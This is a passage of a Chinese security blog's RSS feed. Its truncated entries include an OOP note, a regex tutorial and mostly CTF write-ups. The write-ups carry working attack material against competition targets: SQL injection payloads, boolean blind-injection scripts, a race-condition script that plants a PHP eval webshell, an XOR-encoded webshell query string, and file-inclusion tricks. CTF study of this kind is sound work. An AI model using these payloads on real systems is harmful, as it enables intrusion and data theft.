-把搅拌、翻炒、监测火候封装成自动炒菜机 把倒洗洁精、刷碗、擦干水封装成自动洗碗机 再把剩下的封装成你的女朋友
- 两者的对比  面向对象本身是对面向过程的封装 面向过程什么最重要？  按步骤划分 把每个任务，分解成具体的每个步骤   面向对象什么最重要？  按功能就行划分 找到对象，确定对象的属性、行为   如何从面向过程思想转化为面向对象思想？  和面向过程一样，先找到所有步骤 试图分离功能代码块 将这些功能代码块，划分到某对象中 根据对象行为，抽象出 “类”   对象和类的关系  对象-&amp;gt;抽象-&amp;gt;类-&amp;gt;实例化-&amp;gt;对象     对象和类 对象和类里面有两个东西：
- 属性 方法  属性是静态的、用来描述这个类或者对象本身的变量
-比如，张三这个对象，他的属性有年龄、性别、身高、体重 人这个类属性也有年龄、性别、身高、体重
-张三能执行吃饭这个动作，这就是他的一个方法
-现在我们来新建一个类，把他实例化为一个对象并且给他一些属性：
-# python3class Person:passzhangsan = Person()#实例化为对象zhangsan.</description>
-    </item>
-    
-    <item>
-      <title>RoarCTF 2020</title>
-      <link>https://anthem-whisper.github.io/tmp/roarctf-2020/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/roarctf-2020/</guid>
-      <description>ezsql 考点：布尔盲注，MySQL_8.0.19新特性table语句，无列名盲注
-截图截没有了，忘了，简单说下思路：
-传统艺能sqli，本来是一个常规的布尔盲注，不过由于waf写的很黑，大小写ban掉了select，导致没有办法跨表查询，只能同表查询或者查库名：
-admin&#39;/**/and/**/ascii(substr(database(),1,1))&amp;gt;32#//库名ctfadmin&#39;/**/and/**/ascii(substr(password,1,1))&amp;gt;32#//密码b4bc4c343ed120df3bff56d586e6d617本来测出来有堆叠，但是由于waf写的很黑，堆叠也胎死腹中。
-注出来密码md5(gml666)==b4bc4c343ed120df3bff56d586e6d617之后，登陆，提示no flag； 由于waf写的很黑，这到题如果MySQL版本不是&amp;gt;=8.0.19的话就是没有方法做的；
-我们能够在官方文档找到以下资料
- The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:
-TABLE t; SELECT * FROM t; You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)</description>
-    </item>
-    
-    <item>
-      <title>starCTF2021复现</title>
-      <link>https://anthem-whisper.github.io/tmp/starctf2021%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/starctf2021%E5%A4%8D%E7%8E%B0/</guid>
-      <description>oh-my-note 考点：时间戳爆破
-题目分析 先给了源码：source.zip
-题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有
-代码审计 打开源码，审计；
-在create_note()函数中，如果用户不存在，就会自动创建
-@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间 random.</description>
-    </item>
-    
-    <item>
-      <title>SWPU2019 复现</title>
-      <link>https://anthem-whisper.github.io/tmp/swpu2019-%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/swpu2019-%E5%A4%8D%E7%8E%B0/</guid>
-      <description>Web2 考点：redis弱口令，python反序列化
-BUU上面的环境需要 Shadowsocks 代理才能访问，配置这个都搞了半天（tcl
-下载配置shadowsocks sudo apt-get install shadowsocks连接代理 sslocal -s node3.buuoj.cn -p 11111 -k 123456报错：AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup
-报错参考：https://www.jianshu.com/p/3f874d5aac54
-在Python2.7中的openssl文件中,下面这个函数没有定义,具体就是这个:
-EVP_CIPHER_CTX_cleanup更深层的是是由于在openssl1.1.0版本中，废弃了 EVP_CIPHER_CTX_cleanup 函数,要用这个函数 EVP_CIPHER_CTX_reset() 代替;
-直接 vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py 打开文件，全局搜索关键字替换即可；
-kali下编译安装proxychains4 编译安装 git clone https://github.com/rofl0r/proxychains-ng.git # downloadcd proxychains-ng./configuresudo make sudo make installcp ./src/proxychains.conf /etc/proxychains.conf # config file用proxychains做正向代理 vim /etc/proxychains.conf添加一行：socks5 127.0.0.1 1080（具体取决于你的ss配置的端口）
-不过我这里需要注释掉原来的那一行 socks4 127.0.0.1 9050
-命令行访问内网 proxychains4 ping web 只需在前面加 proxychains4 就行了</description>
-    </item>
-    
-    <item>
-      <title>W&amp;MCTF2020</title>
-      <link>https://anthem-whisper.github.io/tmp/wmctf2020/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/wmctf2020/</guid>
-      <description>0day大战，，，打不动，告辞
- web_checkin 考点：文件包含file协议
-&amp;lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#39;content&#39;])) {$content = $_GET[&#39;content&#39;];if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))die(&#39;hacker&#39;);if(file_exists($content))require_once($content);file_put_contents($content,&#39;&amp;lt;?php exit();&#39;.$content);}直接file读取根目录flag
-?content=file:///flagWMCTF{a1sc8591as98c1a96s85c165as1cas7d89}
-Make PHP Great Again 考点：session.upload_progress文件包含，条件竞争
-referer:https://www.freebuf.com/news/202819.html
-exp:
-#coding=utf-8import ioimport requestsimport threadingsessid = &#39;TGAO&#39;data = {&amp;quot;cmd&amp;quot;:&amp;quot;system(&#39;tac /var/www/html/flag.php&#39;);&amp;quot;}def write(session):while True:f = io.BytesIO(b&#39;a&#39; *100* 50)resp = session.post( &#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&#39;}, files={&#39;file&#39;: (&#39;tgao.</description>
-    </item>
-    
-    <item>
-      <title>WHUCTF2020</title>
-      <link>https://anthem-whisper.github.io/tmp/whuctf2020/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/whuctf2020/</guid>
-      <description>武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了
- Easy_sqli 考点：bool盲注，双写绕过
-简单，没啥好讲的
-#wh1sperimport requestshost = &#39;http://218.197.154.9:10011/login.php#&#39;def mid(bot, top):return (int)(0.5 * (top + bot))def sqli():name = &#39;&#39;for j in range(1, 250):top = 126bot = 32while 1:babyselect = &#39;(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)&#39;#select = &amp;quot;1&#39; oorr ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{} #&amp;quot;.format(j, mid(bot, top))data = {&amp;quot;user&amp;quot;: select, &amp;quot;pass&amp;quot;: &amp;quot;a&amp;quot;}r = requests.post(url=host, data=data)#print(data)if &#39;Login success!&#39; in r.text: # 成功if top - 1 == bot: # top和bot相邻，说明name是topname += chr(top)print(name)breakbot = mid(bot, top) # 成功就上移botelse: # 失败if top - 1 == bot: # top和bot相邻，加上失败，说明name是botname += chr(bot)print(name)breaktop = mid(bot, top) # 失败就下移topif __name__ == &#39;__main__&#39;:sqli()WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet?</description>
-    </item>
-    
-    <item>
-      <title>“第五空间”智能安全大赛</title>
-      <link>https://anthem-whisper.github.io/tmp/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</guid>
-      <description>hate-php 考点：异或取反构造无字母数字webshell
-开题送码：
-&amp;lt;?phperror_reporting(0);if(!isset($_GET[&#39;code&#39;])){highlight_file(__FILE__);}else{$code = $_GET[&#39;code&#39;];if (preg_match(&#39;/(f|l|a|g|\.|p|h|\/|;|\&amp;quot;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;,$code)) { die(&#39;You are too good for me&#39;); }$blacklist = get_defined_functions()[&#39;internal&#39;];foreach ($blacklist as $blackitem) { if (preg_match (&#39;/&#39; . $blackitem . &#39;/im&#39;, $code)) { die(&#39;You deserve better&#39;); } }assert($code);}preg_match ban掉了下划线等字符，然后 get_defined_functions()[&#39;internal&#39;] 禁用了内置函数
-但是没有过滤取反~和异或^，
-PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过 (&#39;phpinfo&#39;)(); 来执行函数，第一个括号中可以是任意PHP表达式。
-不但如此，这个payload还支持接受参数，比如 (&#39;phpinfo&#39;)(1) ，这道题过滤了分号，但是这道题不需要分号也可以执行
-那么我们自然可以用这个来执行一些代码；
-?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo成功返回了 phpinfo ，我们继续构造一个shell：
-?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})&amp;amp;%ee=system&amp;amp;%ff=ls可以看到ls的结果，不过cat好像又被宰掉了，用 tac fl* 来获取flag
-do you know 预期：gopher协议SSRF打XXE，URL编码显示空字符，pop链</description>
-    </item>
-    
-    <item>
-      <title>中计量现科CTF竞赛</title>
-      <link>https://anthem-whisper.github.io/tmp/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/</guid>
-      <description>由中国计量大学现代科技学院主办的比赛。
- easyweb 源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过
-?password[]=shit成绩单 白给题，Union注入无任何过滤，上来直接一血
-id=-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#//fl4g,scid=-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;fl4g&#39;#//flagid=-1&#39; union select 1,flag,3,4 from fl4g#//flag{Sql_INJECT0N_4813drd8hz4}shop 考点：条件竞争
-说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。
-什么是条件竞争 参考：https://www.jianshu.com/p/09d0eb938e6a
-竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。
-开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。
-线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。
-两个例子 例1：金额提现 假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。
-例2：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”
-攻击：首先上传一个php文件
-当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。
-回到题目 打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮
-思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次
-注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多
-POST / HTTP/1.1Host: aaaed42d.yunyansec.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.</description>
-    </item>
-    
-    <item>
-      <title>正则表达式学习笔记</title>
-      <link>https://anthem-whisper.github.io/tmp/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
-      <description>转自：https://www.cnblogs.com/zery/p/3438845.html
-教程：https://www.runoob.com/regexp/regexp-tutorial.html
-一 、前言 　对于正则表达式，相信很多人都知道，但是很多人的第一感觉就是难学，因为看第一眼时，觉得完全没有规律可寻，而且全是一堆各种各样的特殊符号，完全不知所云。
-其实只是对正则不了解而以，了解了你就会发现，原来就这样啊正则所用的相关字符其实不多，也不难记，更不难懂，唯一难的就是组合起来之后，可读性比较差，而且不容易理解，本文旨在让大家对正则有一个基本的了解，能看得懂简单的正则表达式，写得出简单的正则表达式，用以满足日常开发中的需求即可。
-0\d{2}-\d{8}|0\d{3}-\d{7} 先来一段正则，如果你对正则不了解，是不是完全不知道这一串字符是什么意思？这不要紧文章会详细解释每个字符的含义的。
-1.1 什么是正则表达式
-正则表达式是一种特殊的字符串模式，用于匹配一组字符串，就好比用模具做产品，而正则就是这个模具，定义一种规则去匹配符合规则的字符。
-1.2 常用的正则匹配工具
-在线匹配工具：
-　1 http://www.regexpal.com/
-2 http://rubular.com/
-二 、正则字符简单介绍 2.1 元字符介绍
-&amp;quot;^&amp;quot; ：^会匹配行或者字符串的起始位置，有时还会匹配整个文档的起始位置。
-&amp;quot;$&amp;quot; ：$会匹配行或字符串的结尾
-如图
-​ 而且被匹配的字符必须是以This开头有空格也不行，必须以Regex结尾，也不能有空格与其它字符
-&amp;quot;\b&amp;quot; :不会消耗任何字符只匹配一个位置，常用于匹配单词边界 如 我想从字符串中&amp;quot;This is Regex&amp;quot;匹配单独的单词 &amp;ldquo;is&amp;rdquo; 正则就要写成 &amp;ldquo;\bis\b&amp;rdquo;
-　\b 不会匹配is 两边的字符，但它会识别is 两边是否为单词的边界
-&amp;quot;\d&amp;quot;: 匹配数字，
-　例如要匹配一个固定格式的电话号码以0开头前4位后7位，如0737-5686123 正则:^0\d\d\d-\d\d\d\d\d\d\d$ 这里只是为了介绍&amp;quot;\d&amp;quot;字符，实际上有更好的写法会在 下面介绍。
-&amp;quot;\w&amp;quot;：匹配字母，数字，下划线.
-　例如我要匹配&amp;quot;a2345BCD__TTz&amp;quot; 正则：&amp;quot;\w+&amp;quot; 这里的&amp;quot;+&amp;ldquo;字符为一个量词指重复的次数，稍后会详细介绍。
-&amp;quot;\s&amp;rdquo;：匹配空格
-　例如字符 &amp;ldquo;a b c&amp;rdquo; 正则：&amp;quot;\w\s\w\s\w&amp;quot; 一个字符后跟一个空格，如有字符间有多个空格直接把&amp;quot;\s&amp;quot; 写成 &amp;ldquo;\s+&amp;rdquo; 让空格重复
-&amp;quot;.&amp;quot;：匹配除了换行符以外的任何字符
-　这个算是&amp;quot;\w&amp;quot;的加强版了&amp;quot;\w&amp;quot;不能匹配 空格 如果把字符串加上空格用&amp;quot;\w&amp;quot;就受限了，看下用 &amp;ldquo;.</description>
-    </item>
-    
-    <item>
-      <title>由MRCTF2020学习反序列化POP链</title>
-      <link>https://anthem-whisper.github.io/tmp/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</guid>
-      <description>复现地址：BUUOJ
-打开题目即送源码：MRCTF_ezpop
-先说PHP的一些魔术方法：
-__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问（或不存在）的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发有了这些知识后，我们再来分析源码；
-Welcome to index.php&amp;lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier {protected $var;public function append($value){include($value);}public function __invoke(){$this-&amp;gt;append($this-&amp;gt;var);}}class Show{public $source;public $str;public function __construct($file=&#39;index.php&#39;){$this-&amp;gt;source = $file;echo &#39;Welcome to &#39;.</description>
-    </item>
-    
-    <item>
-      <title>纵横杯 Writeup by X1cT34m</title>
-      <link>https://anthem-whisper.github.io/tmp/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</guid>
-      <description>web easyci 考点：MySQL读写文件
-和巅峰极客的前端一样，而且发现也是布尔盲注，一阵狂喜；
-fuzz一番竟然没有任何过滤
-exp:
-#python3 import requests import time host = &amp;#39;http://eci-2zegnayqf8pwz72ze2yw.cloudeci1.ichunqiu.com/public/index.php/home/login&amp;#39; def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = &amp;#39;&amp;#39; for i in flag: res += hex(ord(i)) res = &amp;#39;0x&amp;#39; + res.replace(&amp;#39;0x&amp;#39;, &amp;#39;&amp;#39;) return res def sqli(): name = &amp;#39;&amp;#39; for j in range(1, 2000): top = 126 bot = 32 while top &amp;gt; bot: #babyselect = &amp;#39;(database())&amp;#39;#p3rh4ps babyselect = &amp;#39;password&amp;#39;#c3762483bc73d0b7943156d43911ce38-&amp;gt;HEIHEIHEIHEI #babyselect = &amp;#34;&amp;#34; payload = &amp;#34;0&amp;#39;||ascii(substr({},{},1))&amp;gt;{}#&amp;#34;.</description>
-    </item>
-    
-    <item>
-      <title>绕过4-5个字符限制getshell</title>
-      <link>https://anthem-whisper.github.io/tmp/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://anthem-whisper.github.io/tmp/%E7%BB%95%E8%BF%874-5%E4%B8%AA%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6getshell/</guid>
-      <description>这个东西起源于HITCON CTF 2017的一道题，高校战疫Hack Me也曾经出现过，最近突然做到了来说一下
-参考：https://www.anquanke.com/post/id/87203
- 源码 五字版本
-&amp;lt;?php$sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 5) {@exec($_GET[&#39;cmd&#39;]);} else if (isset($_GET[&#39;reset&#39;])) {@exec(&#39;/bin/rm -rf &#39; . $sandbox);}highlight_file(__FILE__);四字版本：
-&amp;lt;?php$sandbox = &#39;/www/sandbox/&#39; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if (isset($_GET[&#39;cmd&#39;]) &amp;amp;&amp;amp; strlen($_GET[&#39;cmd&#39;]) &amp;lt;= 4) {@exec($_GET[&#39;cmd&#39;]);} else if (isset($_GET[&#39;reset&#39;])) {@exec(&#39;/bin/rm -rf &#39; . $sandbox);}highlight_file(__FILE__);预备知识 在cmd长度小于5（4）个字符的时候用 exec 函数执行系统命令，不过 exec 函数是默认没有回显的，这里我们就只能盲打。</description>
-    </item>
-    
-  </channel>
-</rss>
